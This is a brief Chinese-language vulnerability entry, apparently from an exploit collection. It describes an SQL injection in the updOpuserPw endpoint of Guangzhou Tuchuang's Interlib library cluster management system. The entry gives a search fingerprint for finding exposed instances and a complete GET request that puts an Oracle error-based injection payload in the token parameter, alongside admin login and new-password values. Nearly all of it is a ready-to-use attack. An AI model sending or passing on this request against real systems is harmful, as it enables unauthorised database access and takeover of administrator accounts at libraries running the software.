# 广州图创图书馆集群管理系统updOpuserPw接口存在SQL注入漏洞

广州图创图书馆集群管理系统updOpuserPw接口 ｜ SQL注入 ｜ —
- **指纹**：`body="interlib/common/"`
- **请求**：`GET /interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%20111111*1111111%20from%20dual))=%272 HTTP/1.1`